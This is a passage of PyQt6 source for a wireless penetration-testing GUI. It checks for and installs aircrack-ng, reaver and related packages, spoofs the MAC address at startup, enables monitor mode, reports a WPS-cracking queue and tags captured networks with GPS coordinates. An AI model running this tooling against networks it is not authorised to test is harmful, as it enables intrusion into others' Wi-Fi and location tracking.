            category.setExpanded(True)

        # Add components to categories
        for name, comp in summary['components'].items():
            # Determine category
            if name in ['airmon-ng', 'airodump-ng', 'aircrack-ng', 'aireplay-ng', 'iw', 'iwconfig', 'rfkill', 'wash']:
                parent = wifi_category
                package = 'aircrack-ng' if name in ['airmon-ng', 'airodump-ng', 'aircrack-ng', 'aireplay-ng'] else ('wireless-tools' if name == 'iwconfig' else ('iw' if name == 'iw' else ('util-linux' if name == 'rfkill' else 'reaver')))
            elif name in ['hcitool', 'bluetoothctl', 'hciconfig']:
                parent = bt_category
                package = 'bluez'
            elif name in ['rtl_test', 'rtl_sdr', 'hackrf_info']:
                parent = sdr_category
                package = 'rtl-sdr' if 'rtl' in name else 'hackrf'
            elif name.startswith('python'):
                parent = python_category
                package = 'python3'
            else:
                parent = other_category
                package = name

            # Create item
            status_text = "✓ Installed" if comp.installed else "✗ MISSING"
            if comp.required and not comp.installed:
                status_text += " (REQUIRED!)"

            item = QTreeWidgetItem(parent, [
                comp.name,
                status_text,
                comp.version or "Unknown",
                ""  # Actions column (will add button)
            ])

            # Color coding
            from PyQt6.QtGui import QColor
            if comp.installed:
                item.setForeground(1, QColor(0, 200, 0))  # Green
            else:
                if comp.required:
                    item.setForeground(1, QColor(255, 0, 0))  # Red
                else:
                    item.setForeground(1, QColor(200, 200, 0))  # Yellow

                # Add install button for missing components
                install_btn = QPushButton("Install")
                install_btn.setMaximumWidth(80)
                install_btn.clicked.connect(lambda checked, pkg=package, cname=name: self.install_component(pkg, cname))
                self.status_tree.setItemWidget(item, 3, install_btn)

    def check_for_updates(self):
        """Check for component updates"""
        import subprocess

        reply = QMessageBox.question(
            self,
            "Check for Updates",
            "This will run:\n\nsudo apt-get update\n\nto refresh package lists.\n\nContinue?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            try:
                # Run apt-get update
                result = subprocess.run(
                    ['sudo', 'apt-get', 'update'],
                    capture_output=True,
                    text=True,
                    timeout=120
                )

                if result.returncode == 0:
                    QMessageBox.information(
                        self,
                        "Update Check Complete",
                        "Package lists have been updated successfully.\n\n"
                        "Click 'Refresh Status' to see if any components can be updated."
                    )
                    self.refresh_system_status()
                else:
                    QMessageBox.warning(
                        self,
                        "Update Failed",
                        f"Failed to update package lists:\n\n{result.stderr}"
                    )
            except subprocess.TimeoutExpired:
                QMessageBox.warning(self, "Timeout", "Update check timed out after 2 minutes.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Error checking for updates:\n\n{str(e)}")

    def install_all_missing(self):
        """Install all missing required components"""
        from ..core.system_status import SystemStatusChecker
        import subprocess

        summary = SystemStatusChecker.get_summary()
        missing = [name for name, comp in summary['components'].items() if not comp.installed and comp.required]

        if not missing:
            QMessageBox.information(
                self,
                "All Installed",
                "All required components are already installed!"
            )
            return

        # Map components to packages
        packages = set()
        for name in missing:
            if name in ['airmon-ng', 'airodump-ng', 'aircrack-ng', 'aireplay-ng']:
                packages.add('aircrack-ng')
            elif name == 'iwconfig':
                packages.add('wireless-tools')
            elif name == 'iw':
                packages.add('iw')
            elif name == 'rfkill':
                packages.add('util-linux')
            elif name == 'wash':
                packages.add('reaver')
            elif name in ['hcitool', 'bluetoothctl', 'hciconfig']:
                packages.add('bluez')
            elif name == 'rtl_test' or name == 'rtl_sdr':
                packages.add('rtl-sdr')
            elif name == 'hackrf_info':
                packages.add('hackrf')

        packages_str = ' '.join(packages)

        reply = QMessageBox.question(
            self,
            "Install Missing Components",
            f"This will install the following packages:\n\n{packages_str}\n\n"
            f"Command:\nsudo apt-get install -y {packages_str}\n\nContinue?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            try:
                # Run apt-get install
                result = subprocess.run(
                    ['sudo', 'apt-get', 'install', '-y'] + list(packages),
                    capture_output=True,
                    text=True,
                    timeout=300
                )

                if result.returncode == 0:
                    QMessageBox.information(
                        self,
                        "Installation Complete",
                        f"Successfully installed:\n\n{packages_str}\n\n"
                        "Refreshing component status..."
                    )
                    self.refresh_system_status()
                else:
                    QMessageBox.warning(
                        self,
                        "Installation Failed",
                        f"Some packages failed to install:\n\n{result.stderr}"
                    )
            except subprocess.TimeoutExpired:
                QMessageBox.warning(self, "Timeout", "Installation timed out after 5 minutes.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Error installing components:\n\n{str(e)}")

    def install_component(self, package: str, component_name: str):
        """Install a specific component"""
        import subprocess

        reply = QMessageBox.question(
            self,
            "Install Component",
            f"Install {component_name}?\n\n"
            f"This will run:\nsudo apt-get install -y {package}\n\nContinue?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            try:
                # Run apt-get install
                result = subprocess.run(
                    ['sudo', 'apt-get', 'install', '-y', package],
                    capture_output=True,
                    text=True,
                    timeout=300
                )

                if result.returncode == 0:
                    QMessageBox.information(
                        self,
                        "Installation Complete",
                        f"Successfully installed {package}\n\nRefreshing component status..."
                    )
                    self.refresh_system_status()
                else:
                    QMessageBox.warning(
                        self,
                        "Installation Failed",
                        f"Failed to install {package}:\n\n{result.stderr}"
                    )
            except subprocess.TimeoutExpired:
                QMessageBox.warning(self, "Timeout", "Installation timed out after 5 minutes.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Error installing {package}:\n\n{str(e)}")


class MultiRowTabBar(QTabBar):
    """Custom tab bar that supports multiple rows (up to 3 rows) spanning full width"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.max_rows = 3
        self.setExpanding(True)  # Make tabs expand to fill space
        self.setDrawBase(False)

    def sizeHint(self):
        """Override to return size that accommodates multiple rows"""
        from PyQt6.QtCore import QSize

        if self.count() == 0:
            return QSize(800, 40)

        # Get parent width
        parent = self.parentWidget()
        parent_width = parent.width() if parent and parent.width() > 100 else 800

        # Calculate number of rows needed
        num_rows = self._calculate_num_rows(parent_width)
        tab_height = 40
        total_height = num_rows * tab_height

        return QSize(parent_width, total_height)

    def minimumSizeHint(self):
        """Minimum size hint"""
        return self.sizeHint()

    def _calculate_num_rows(self, parent_width):
        """Calculate how many rows are needed"""
        if self.count() == 0:
            return 1

        # Calculate how many tabs fit per row (minimum 180px per tab for readable content)
        min_tab_width = 180
        tabs_per_row = max(1, parent_width // min_tab_width)

        # Calculate number of rows needed
        num_rows = (self.count() + tabs_per_row - 1) // tabs_per_row

        # Limit to max_rows
        return min(num_rows, self.max_rows)

    def tabSizeHint(self, index):
        """Override to return appropriate tab size that fills the row"""
        from PyQt6.QtCore import QSize

        if self.count() == 0:
            return QSize(180, 40)

        # Get parent width
        parent = self.parentWidget()
        parent_width = parent.width() if parent and parent.width() > 100 else 800

        # Calculate how many tabs per row (minimum 180px per tab)
        min_tab_width = 180
        tabs_per_row = max(1, parent_width // min_tab_width)

        # Calculate tab width to fill the row evenly
        # Reserve 10px for margins
        tab_width = (parent_width - 10) // tabs_per_row

        # Ensure tabs are at least min_tab_width
        tab_width = max(tab_width, min_tab_width)

        return QSize(tab_width, 40)

    def tabRect(self, index):
        """Override to return correct position for tab in multi-row layout"""
        from PyQt6.QtCore import QRect

        if index < 0 or index >= self.count():
            return QRect()

        # Get parent width
        parent = self.parentWidget()
        parent_width = parent.width() if parent and parent.width() > 100 else 800

        # Calculate tabs per row (minimum 180px per tab)
        min_tab_width = 180
        tabs_per_row = max(1, parent_width // min_tab_width)

        # Calculate tab width
        tab_width = (parent_width - 10) // tabs_per_row
        tab_width = max(tab_width, min_tab_width)  # Ensure minimum width

        # Calculate which row and column this tab is in
        row = index // tabs_per_row
        col = index % tabs_per_row

        # Calculate position
        x = col * tab_width
        y = row * 40

        return QRect(x, y, tab_width, 40)

    def resizeEvent(self, event):
        """Handle resize to recalculate layout"""
        super().resizeEvent(event)
        # Force geometry update
        self.updateGeometry()
        # Force repaint
        self.update()


class MainWindow(QMainWindow):
    """Main application window"""

    def __init__(self):
        super().__init__()
        self.status_monitor = None
        self.current_theme = "sonic"  # Default theme
        self.system_tray = None
        self.notification_manager = None
        self.dynamic_theme = None  # Dynamic 24/7 theme
        self.load_config()
        self.init_ui()
        self.init_system_tray()  # Initialize system tray
        self.start_monitoring()
        self.init_mac_spoofing()  # Auto-spoof MAC at boot (if enabled) - MUST be before monitor mode
        self.init_monitor_mode()  # Auto-enable monitor mode
        self.init_dynamic_theme()  # Initialize 24/7 dynamic theme
        self.init_local_api()  # Start local API server for testing/automation

    def load_config(self):
        """Load configuration including theme preference"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            self.current_theme = config.get('app.theme', 'sonic')
        except Exception as e:
            print(f"[!] Error loading config: {e}")
            self.current_theme = "sonic"

    def save_config(self):
        """Save configuration including theme preference"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            config.set('app.theme', self.current_theme, value_type='string', category='app', description='UI theme name')
            # No need to call save() - database auto-saves
        except Exception as e:
            print(f"[!] Error saving config: {e}")

    def init_ui(self):
        """Initialize the main window UI"""
        self.setWindowTitle("Gattrose-NG - Wireless Penetration Testing Suite")
        self.setMinimumSize(1200, 800)

        # Set window icon
        from PyQt6.QtGui import QIcon
        from pathlib import Path
        icon_path = Path(__file__).parent.parent.parent / "assets" / "gattrose-ng.png"
        if icon_path.exists():
            self.setWindowIcon(QIcon(str(icon_path)))

        # Create menu bar
        self.create_menu_bar()

        # Create toolbar
        self.create_toolbar()

        # Create network status bar
        self.create_network_status_bar()

        # Create central widget with tabs
        self.create_tabs()

        # Create status bar
        self.create_status_bar()

        # Apply theme from config (after UI elements are created)
        self.apply_theme(self.current_theme, save=False)

        # Center window on screen
        self.center_on_screen()

    def create_menu_bar(self):
        """Create the menu bar"""
        menubar = self.menuBar()

        # File menu
        file_menu = menubar.addMenu("&File")

        new_scan_action = QAction("&New Scan", self)
        new_scan_action.setShortcut("Ctrl+N")
        file_menu.addAction(new_scan_action)

        file_menu.addSeparator()

        exit_action = QAction("E&xit", self)
        exit_action.setShortcut("Ctrl+Q")
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)

        # Tools menu
        tools_menu = menubar.addMenu("&Tools")

        aircrack_action = QAction("&Aircrack-ng", self)
        tools_menu.addAction(aircrack_action)

        monitor_action = QAction("&Monitor Mode", self)
        tools_menu.addAction(monitor_action)

        # Database menu
        db_menu = menubar.addMenu("&Database")

        view_db_action = QAction("&View Database", self)
        db_menu.addAction(view_db_action)

        import_action = QAction("&Import WiGLE Data", self)
        db_menu.addAction(import_action)

        export_action = QAction("&Export Data", self)
        db_menu.addAction(export_action)

        # Help menu
        help_menu = menubar.addMenu("&Help")

        about_action = QAction("&About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)

        docs_action = QAction("&Documentation", self)
        help_menu.addAction(docs_action)

    def create_toolbar(self):
        """Create the toolbar"""
        toolbar = QToolBar("Main Toolbar")
        toolbar.setMovable(False)
        self.addToolBar(toolbar)

        # Add toolbar actions
        scan_action = QAction("Scan", self)
        scan_action.setStatusTip("Start network scan")
        toolbar.addAction(scan_action)

        monitor_action = QAction("Monitor", self)
        monitor_action.setStatusTip("Enable monitor mode")
        toolbar.addAction(monitor_action)

        toolbar.addSeparator()

        stop_action = QAction("Stop", self)
        stop_action.setStatusTip("Stop current operation")
        toolbar.addAction(stop_action)

    def create_network_status_bar(self):
        """Initialize network interface status labels (added to bottom status bar)"""
        # Interface info labels (will be added to status bar in create_status_bar())
        self.iface_label = QLabel("Interface: Detecting...")
        self.mac_label = QLabel("MAC: --:--:--:--:--:--")
        self.spoofed_mac_label = QLabel("Spoofed: None")
        self.mode_label = QLabel("Mode: Managed")
        self.driver_label = QLabel("Driver: Unknown")

        # Style labels
        for label in [self.iface_label, self.mac_label, self.spoofed_mac_label, self.mode_label, self.driver_label]:
            label.setStyleSheet("padding: 3px 8px; font-weight: bold;")

        # Start periodic updates
        self.network_status_timer = QTimer()
        self.network_status_timer.timeout.connect(self.update_network_status)
        self.network_status_timer.start(1000)  # Update every 1 second for instant phone detection

        # Initial update
        self.update_network_status()

    def _create_separator(self):
        """Create a vertical separator line"""
        line = QLabel("|")
        line.setStyleSheet("color: #666666; padding: 0 5px;")
        return line

    def _update_service_status(self):
        """Update all service statuses from orchestrator status file"""
        try:
            # Quick check if attributes exist
            if not hasattr(self, 'service_status_labels'):
                return

            import json
            from pathlib import Path
            from datetime import datetime

            status_file = Path("/tmp/gattrose-status.json")
            if not status_file.exists():
                # No status file - mark all services as unknown
                try:
                    for key in self.service_status_labels:
                        current_text = self.service_status_labels[key].text()
                        if ':' in current_text:
                            prefix = current_text.split(':')[0]
                            self.service_status_labels[key].setText(f"{prefix}: --")
                        self.service_status_labels[key].setStyleSheet("color: #999; font-size: 11px;")
                except:
                    pass
                return

            with open(status_file, 'r') as f:
                status = json.load(f)

            services = status.get('services', {})

            # Update each service
            service_configs = {
                'database': {'icon': '💾', 'short': 'DB'},
                'gps': {'icon': '📍', 'short': 'GPS'},
                'scanner': {'icon': '📡', 'short': 'Scan'},
                'upsert': {'icon': '⬆️', 'short': 'Sync'},
                'triangulation': {'icon': '📐', 'short': 'Tri'},
                'wps_cracking': {'icon': '🔓', 'short': 'WPS'}
            }

            for service_key, config in service_configs.items():
                if service_key not in self.service_status_labels:
                    continue

                label = self.service_status_labels[service_key]
                service_status = services.get(service_key, {})
                is_running = service_status.get('running', False)
                status_text = service_status.get('status', 'stopped')
                metadata = service_status.get('metadata', {})

                # Determine status text and color
                if status_text == 'running':
                    color = "#4ecdc4"  # Cyan for running
                    status_icon = "✓"

                    # Add service-specific metadata
                    if service_key == 'gps':
                        has_location = metadata.get('has_location', False)
                        source = metadata.get('source', 'none')
                        if has_location:
                            status_display = f"{config['short']}:{source[:3]}"
                            color = "#4ecdc4" if source in ['gpsd', 'phone-bt', 'phone-usb'] else "#ffcc00"
                        else:
                            status_display = f"{config['short']}:NoFix"
                            color = "#ff6b6b"

                    elif service_key == 'scanner':
                        heartbeat = metadata.get('heartbeat', 'unknown')
                        iface = metadata.get('interface', '')
                        if heartbeat == 'alive':
                            status_display = f"{config['short']}:{iface[:5]}"
                            color = "#4ecdc4"
                        elif heartbeat == 'dead':
                            status_display = f"{config['short']}:Dead"
                            color = "#ff6b6b"
                        else:
                            status_display = f"{config['short']}:?"
                            color = "#999"

                    elif service_key == 'upsert':
                        nets = metadata.get('networks_count', 0)
                        clients = metadata.get('clients_count', 0)
                        status_display = f"{config['short']}:{nets}AP/{clients}CL"
                        color = "#4ecdc4" if nets > 0 else "#ffcc00"

                    elif service_key == 'wps_cracking':
                        queue = metadata.get('queue_size', 0)
                        cracked = metadata.get('total_cracked', 0)
                        if queue > 0:
                            status_display = f"{config['short']}:Q{queue}"
                            color = "#ffcc00"  # Yellow when actively cracking
                        elif cracked > 0:
                            status_display = f"{config['short']}:✓{cracked}"
                            color = "#4ecdc4"
                        else:
                            status_display = f"{config['short']}:Idle"
                            color = "#4ecdc4"

                    else:
                        status_display = f"{config['short']}:✓"

                elif status_text == 'error':
                    color = "#ff6b6b"  # Red for error
                    status_icon = "✗"
                    status_display = f"{config['short']}:Err"

                elif status_text == 'starting':
                    color = "#ffcc00"  # Yellow for starting
                    status_icon = "⏳"
                    status_display = f"{config['short']}:..."

                else:  # stopped or unknown
                    color = "#666"  # Dark gray for stopped
                    status_icon = "⏸"
                    status_display = f"{config['short']}:Off"

                # Update label
                label.setText(f"{config['icon']} {status_display}")
                label.setStyleSheet(f"color: {color}; font-size: 11px;")

                # Build tooltip
                tooltip = f"{service_status.get('name', service_key)}\n"
                tooltip += f"Status: {status_text}\n"
                if metadata:
                    tooltip += "Details:\n"
                    for k, v in metadata.items():
                        tooltip += f"  {k}: {v}\n"
                label.setToolTip(tooltip.strip())

            # Update system stats
            now = datetime.now()
            self.status_time_label.setText(now.strftime("%H:%M:%S"))

            # Update CPU/MEM if available
            try:
                import psutil
                cpu = psutil.cpu_percent(interval=0)
                mem = psutil.virtual_memory().percent
                self.status_cpu_label.setText(f"CPU: {cpu:.1f}%")
                self.status_mem_label.setText(f"MEM: {mem:.1f}%")
            except:
                pass

        except Exception as e:
            print(f"[!] Error updating service status: {e}")

    def _update_gps_status(self):
        """Update GPS status in status bar"""
        try:
            # Read GPS data from status file (orchestrator manages GPS)
            import json
            import os

            lat, lon, alt, acc, source = None, None, None, None, None

            # Try to read from status file first
            if os.path.exists('/tmp/gattrose-status.json'):
                try:
                    with open('/tmp/gattrose-status.json', 'r') as f:
                        status = json.load(f)
                        gps_data = status.get('services', {}).get('gps', {}).get('metadata', {})
                        if gps_data.get('has_location'):
                            lat = gps_data.get('latitude')
                            lon = gps_data.get('longitude')
                            acc = gps_data.get('accuracy')
                            source = gps_data.get('source')
                            # Note: altitude not in metadata currently
                except Exception:
                    pass

            # Fallback to GPS service if status file doesn't have data
            if lat is None:
                from src.services.gps_service import get_gps_service
                gps_service = get_gps_service()
                lat, lon, alt, acc, source = gps_service.get_location()

            if lat is not None and lon is not None:
                # Check if location changed for pulse effect
                current_location = (lat, lon)
                location_changed = self.last_gps_location != current_location
                self.last_gps_location = current_location

                # Format coordinates
                lat_str = f"{abs(lat):.6f}°{'N' if lat >= 0 else 'S'}"
                lon_str = f"{abs(lon):.6f}°{'E' if lon >= 0 else 'W'}"

                # Color code by source accuracy
                if source == 'gpsd':
                    color = "#4ecdc4"  # Cyan for accurate GPS
                    icon = "📍"
                    source_text = "GPS"
                elif source == 'phone-bt' or source == 'phone-usb':
                    color = "#95e1d3"  # Light cyan for phone GPS
                    icon = "📱"
                    source_text = "Phone"
                elif source == 'network':
                    color = "#a8e6cf"  # Green for network GPS
                    icon = "🌐"
                    source_text = "Net"
                elif source == 'geoip':
                    color = "#ffcc00"  # Yellow for inaccurate GeoIP
                    icon = "🌍"
                    source_text = "GeoIP"
                else:
                    color = "#95e1d3"
                    icon = "📍"
                    source_text = source or "GPS"

                # Show accuracy if available
                acc_text = f" (±{int(acc)}m)" if acc and acc < 10000 else ""

                gps_text = f"{icon} {source_text}: {lat_str}, {lon_str}{acc_text}"
                tooltip = f"GPS Coordinates ({source_text})\nLatitude: {lat:.8f}\nLongitude: {lon:.8f}"
                if alt:
                    tooltip += f"\nAltitude: {alt:.1f}m"
                if acc:
                    tooltip += f"\nAccuracy: ±{acc:.1f}m"
                tooltip += "\n\nClick to copy coordinates"

                self.status_gps_label.setText(gps_text)

                # Apply pulse effect when location changes
                if location_changed and not self.gps_pulse_active:
                    self._trigger_gps_pulse(color)
                else:
                    self.status_gps_label.setStyleSheet(f"color: {color}; font-weight: bold;")

                self.status_gps_label.setToolTip(tooltip)
            else:
                self.status_gps_label.setText("📍 GPS: No Fix")
                self.status_gps_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
                self.status_gps_label.setToolTip("No GPS fix available\nClick to see GPS options")

        except Exception as e:
            self.status_gps_label.setText("📍 GPS: Error")
            self.status_gps_label.setToolTip(f"GPS Error: {e}")

    def _trigger_gps_pulse(self, base_color):
        """Trigger a visual pulse effect on GPS label when location updates"""
        self.gps_pulse_active = True

        # Pulse animation: bright -> normal
        pulse_color = "#FFFFFF"  # Bright white flash

        # Set initial bright state
        self.status_gps_label.setStyleSheet(f"color: {pulse_color}; font-weight: bold; background-color: {base_color}; padding: 2px 4px; border-radius: 3px;")

        # Schedule return to normal after 200ms
        QTimer.singleShot(200, lambda: self._reset_gps_pulse(base_color))

    def _reset_gps_pulse(self, base_color):
        """Reset GPS label to normal appearance after pulse"""
        self.status_gps_label.setStyleSheet(f"color: {base_color}; font-weight: bold;")
        self.gps_pulse_active = False

    def _update_scanner_heartbeat(self):
        """Update scanner heartbeat status in status bar"""
        try:
            import json
            from pathlib import Path

            status_file = Path("/tmp/gattrose-status.json")
            if not status_file.exists():
                self.status_scanner_label.setText("💓 Scanner: Unknown")
                self.status_scanner_label.setStyleSheet("color: #999; font-weight: bold;")
                self.status_scanner_label.setToolTip("No orchestrator status available")
                return

            with open(status_file, 'r') as f:
                status = json.load(f)

            scanner_status = status.get('services', {}).get('scanner', {})
            heartbeat = scanner_status.get('metadata', {}).get('heartbeat', 'unknown')
            process_pid = scanner_status.get('metadata', {}).get('process_pid')

            if heartbeat == 'alive':
                self.status_scanner_label.setText(f"💓 Scanner: Alive (PID: {process_pid})")
                self.status_scanner_label.setStyleSheet("color: #4ecdc4; font-weight: bold;")
                self.status_scanner_label.setToolTip(f"Scanner process is running\nairodump-ng PID: {process_pid}")
            elif heartbeat == 'dead':
                self.status_scanner_label.setText("💓 Scanner: Dead")
                self.status_scanner_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
                self.status_scanner_label.setToolTip("Scanner process has died - restart needed")
            else:
                self.status_scanner_label.setText("💓 Scanner: Unknown")
                self.status_scanner_label.setStyleSheet("color: #999; font-weight: bold;")
                self.status_scanner_label.setToolTip("Scanner status unknown")

        except Exception as e:
            self.status_scanner_label.setText("💓 Scanner: Error")
            self.status_scanner_label.setToolTip(f"Error reading scanner status: {e}")

    def _show_gps_settings(self):
        """Show GPS settings dialog with current fix details"""
        try:
            from src.services.gps_service import get_gps_service
            from src.gui.gps_setup_dialog import show_gps_setup_wizard
            from PyQt6.QtWidgets import QDialog, QVBoxLayout, QHBoxLayout, QGroupBox, QTextEdit, QPushButton, QApplication, QMessageBox
            from PyQt6.QtCore import Qt

            gps_service = get_gps_service()
            lat, lon, alt, acc, source = gps_service.get_location()

            # If no GPS fix and source is GeoIP or None, offer to run setup wizard
            if (lat is None or source in ['geoip', None]):
                reply = QMessageBox.question(
                    self,
                    "GPS Setup",
                    "No accurate GPS source detected.\n\n"
                    "Would you like to set up Android phone GPS now?\n\n"
                    "This will provide ±10-20m accuracy instead of GeoIP's ±1-100km.",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                )

                if reply == QMessageBox.StandardButton.Yes:
                    if show_gps_setup_wizard(self):
                        # Setup completed, refresh GPS service
                        self.status_bar.showMessage("✅ GPS setup complete! Refreshing...", 3000)
                        return
                    else:
                        # User skipped or cancelled
                        pass
                # Continue to show settings dialog anyway

            # Create dialog
            dialog = QDialog(self)
            dialog.setWindowTitle("GPS Settings & Current Fix")
            dialog.setMinimumSize(600, 500)
            dialog.setStyleSheet("""
                QDialog { background-color: #1e1e1e; color: #e0e0e0; }
                QGroupBox {
                    border: 2px solid #3a3a3a;
                    border-radius: 5px;
                    margin-top: 10px;
                    padding: 15px;
                    font-weight: bold;
                }
                QGroupBox::title {
                    subcontrol-origin: margin;
                    left: 10px;
                    padding: 0 5px;
                }
                QLabel { color: #e0e0e0; }
                QTextEdit {
                    background-color: #2a2a2a;
                    color: #00ff00;
                    border: 1px solid #3a3a3a;
                    font-family: monospace;
                }
                QPushButton {
                    background-color: #4a4a4a;
                    color: #ffffff;
                    border: 1px solid #5a5a5a;
                    border-radius: 3px;
                    padding: 8px 15px;
                    font-weight: bold;
                }
                QPushButton:hover { background-color: #5a5a5a; }
                QPushButton:pressed { background-color: #3a3a3a; }
            """)

            layout = QVBoxLayout()

            # Current Fix Group
            fix_group = QGroupBox("📍 Current GPS Fix")
            fix_layout = QVBoxLayout()

            fix_text = QTextEdit()
            fix_text.setReadOnly(True)
            fix_text.setMaximumHeight(200)

            fix_info = []
            fix_info.append("=" * 60)
            fix_info.append("GPS STATUS")
            fix_info.append("=" * 60)

            if lat is not None and lon is not None:
                # Format coordinates
                lat_str = f"{abs(lat):.8f}°{'N' if lat >= 0 else 'S'}"
                lon_str = f"{abs(lon):.8f}°{'E' if lon >= 0 else 'W'}"

                fix_info.append(f"Status:     🟢 FIX ACQUIRED")
                fix_info.append(f"Latitude:   {lat_str}")
                fix_info.append(f"Longitude:  {lon_str}")

                if alt is not None:
                    fix_info.append(f"Altitude:   {alt:.2f}m")

                if acc is not None:
                    fix_info.append(f"Accuracy:   ±{acc:.1f}m")

                fix_info.append(f"Source:     {source.upper() if source else 'UNKNOWN'}")
                fix_info.append("")
                fix_info.append(f"Google Maps: {lat:.8f}, {lon:.8f}")

                # Quality assessment
                if source == 'gpsd':
                    quality = "EXCELLENT (GPS Daemon)"
                elif source == 'phone-usb':
                    quality = "VERY GOOD (Phone GPS via USB)"
                elif source == 'phone-bt':
                    quality = "GOOD (Phone GPS via Bluetooth)"
                elif source == 'network':
                    quality = "MODERATE (Network GPS)"
                elif source == 'geoip':
                    quality = "LOW (GeoIP Approximation)"
                else:
                    quality = "UNKNOWN"

                fix_info.append(f"Quality:    {quality}")
            else:
                fix_info.append(f"Status:     🔴 NO FIX")
                fix_info.append("")
                fix_info.append("No GPS fix available")
                fix_info.append("")
                fix_info.append("Available GPS Sources:")
                fix_info.append("  • GPS Daemon (gpsd) - Not available")
                fix_info.append("  • Android Phone via USB - Not connected")
                fix_info.append("  • Android Phone via Bluetooth - Not connected")
                fix_info.append("  • Network GPS - Not configured")
                fix_info.append("  • GeoIP Fallback - Active (inaccurate)")

            fix_info.append("=" * 60)

            fix_text.setPlainText("\n".join(fix_info))
            fix_layout.addWidget(fix_text)
            fix_group.setLayout(fix_layout)
            layout.addWidget(fix_group)

            # Phone Status Group (if using phone GPS)
            if source in ['phone-usb', 'phone-bt']:
                phone_status = gps_service.get_phone_status()

                if phone_status and phone_status.get('connected'):
                    phone_group = QGroupBox("📱 Android Phone Status")
                    phone_layout = QVBoxLayout()

                    phone_text = QTextEdit()
                    phone_text.setReadOnly(True)
                    phone_text.setMaximumHeight(150)

                    phone_info = []
                    phone_info.append("=" * 60)
                    phone_info.append("PHONE INFORMATION")
                    phone_info.append("=" * 60)

                    # Device info
                    device_model = phone_status.get('device_model', 'Unknown')
                    android_version = phone_status.get('android_version', 'Unknown')
                    phone_info.append(f"📱 Device:       {device_model}")
                    phone_info.append(f"🤖 Android:      {android_version}")

                    # Battery info
                    battery_level = phone_status.get('battery_level')
                    battery_status_str = phone_status.get('battery_status')
                    if battery_level is not None:
                        battery_icon = "🔋" if battery_level > 20 else "🪫"
                        phone_info.append(f"{battery_icon} Battery:      {battery_level}%")
                        if battery_status_str:
                            phone_info.append(f"⚡ Status:       {battery_status_str}")

                    # GPS satellites
                    satellites = phone_status.get('gps_satellites')
                    if satellites is not None:
                        phone_info.append(f"🛰️  Satellites:   {satellites}")

                    satellites_used = phone_status.get('gps_used_in_fix')
                    if satellites_used is not None:
                        phone_info.append(f"📡 Used in fix:  {satellites_used}")

                    # Connection type
                    connection = "USB" if source == 'phone-usb' else "Bluetooth"
                    phone_info.append(f"🔌 Connection:   {connection}")

                    phone_info.append("=" * 60)

                    phone_text.setPlainText("\n".join(phone_info))
                    phone_layout.addWidget(phone_text)
                    phone_group.setLayout(phone_layout)
                    layout.addWidget(phone_group)

            # GPS Sources Group
            sources_group = QGroupBox("🛰️ Available GPS Sources")
            sources_layout = QVBoxLayout()

            sources_text = QTextEdit()
            sources_text.setReadOnly(True)
            sources_text.setMaximumHeight(180)

            sources_info = []
            sources_info.append("Priority Order (Highest to Lowest):")
            sources_info.append("")
            sources_info.append("1. GPS Daemon (gpsd)")
            sources_info.append("   - Hardware GPS receiver via gpsd daemon")
            sources_info.append("   - Most accurate (±5-10m)")
            sources_info.append("")
            sources_info.append("2. Android Phone (USB/Bluetooth)")
            sources_info.append("   - Phone GPS via ADB or Bluetooth")
            sources_info.append("   - Very accurate (±10-20m)")
            sources_info.append("   - Setup: ./setup_phone_gps.sh")
            sources_info.append("")
            sources_info.append("3. Network GPS")
            sources_info.append("   - Network-based GPS receiver")
            sources_info.append("   - Good accuracy (±20-50m)")
            sources_info.append("")
            sources_info.append("4. GeoIP Fallback")
            sources_info.append("   - IP geolocation (last resort)")
            sources_info.append("   - Poor accuracy (±1-100km)")

            sources_text.setPlainText("\n".join(sources_info))
            sources_layout.addWidget(sources_text)
            sources_group.setLayout(sources_layout)
            layout.addWidget(sources_group)

            # Buttons
            button_layout = QHBoxLayout()

            copy_btn = QPushButton("📋 Copy Coordinates")
            copy_btn.clicked.connect(lambda: self._copy_coords_from_dialog(lat, lon, dialog))

            setup_btn = QPushButton("⚙️ Run Setup Wizard")
            setup_btn.clicked.connect(lambda: dialog.accept() or self._run_gps_setup_wizard())

            close_btn = QPushButton("✖ Close")
            close_btn.clicked.connect(dialog.accept)

            button_layout.addWidget(copy_btn)
            button_layout.addWidget(setup_btn)
            button_layout.addStretch()
            button_layout.addWidget(close_btn)

            layout.addLayout(button_layout)

            dialog.setLayout(layout)
            dialog.exec()

        except Exception as e:
            self.status_bar.showMessage(f"❌ Error showing GPS settings: {e}", 3000)
            import traceback
            traceback.print_exc()

    def _copy_coords_from_dialog(self, lat, lon, dialog):
        """Copy coordinates to clipboard from GPS dialog"""
        try:
            from PyQt6.QtWidgets import QApplication

            if lat is not None and lon is not None:
                coords_text = f"{lat:.8f}, {lon:.8f}"
                QApplication.clipboard().setText(coords_text)
                self.status_bar.showMessage(f"📋 GPS coordinates copied: {coords_text}", 3000)
            else:
                self.status_bar.showMessage("⚠️ No GPS fix available to copy", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error copying GPS: {e}", 3000)

    def _run_gps_setup_wizard(self):
        """Run GPS setup wizard"""
        try:
            from src.gui.gps_setup_dialog import show_gps_setup_wizard

            if show_gps_setup_wizard(self):
                self.status_bar.showMessage("✅ GPS setup complete!", 3000)
            else:
                self.status_bar.showMessage("GPS setup cancelled", 2000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error running GPS setup: {e}", 3000)
            import traceback
            traceback.print_exc()

    def update_network_status(self):
        """Update network interface status information"""
        try:
            import subprocess
            import re

            # Get wireless interface
            iface = None
            mode = "Unknown"

            # Try to find monitor mode interface first
            try:
